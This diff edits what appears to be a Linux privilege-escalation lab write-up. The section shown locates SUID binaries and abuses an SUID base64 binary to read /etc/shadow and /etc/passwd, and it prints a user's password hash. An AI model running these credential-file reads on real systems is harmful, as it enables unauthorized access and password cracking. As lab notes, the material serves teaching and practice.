@@ -313,24 +313,20 @@ LFILE=file_to_read
 * `find / -type f -perm -04000 -ls 2>/dev/null`.
   * `/usr/bin/base64` has SUID bit set.
 ```
-$ LFILE=/etc/shadow
-$ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
+$ LFILE1=/etc/shadow
+$ /usr/bin/base64 "$LFILE1" | base64 --decode | grep user2
 ```
 * Prints contents of the `/etc/shadow` file.
 ```
 user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
 ```
 ```
-$ LFILE=/etc/passwd
-$ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
+$ LFILE2=/etc/passwd
+$ /usr/bin/base64 "$LFILE2" | base64 --decode | grep user2
 ```
 * Prints contents of the `/etc/passwd` file.
 ```
 user2:x:1002:1002::/home/user2:/bin/sh
-```
-* Create temporary 'SUID' folder on Desktop.
-```
-mkdir ./Desktop/SUID
 ```
 * Create empty files in SUID folder.
 ```
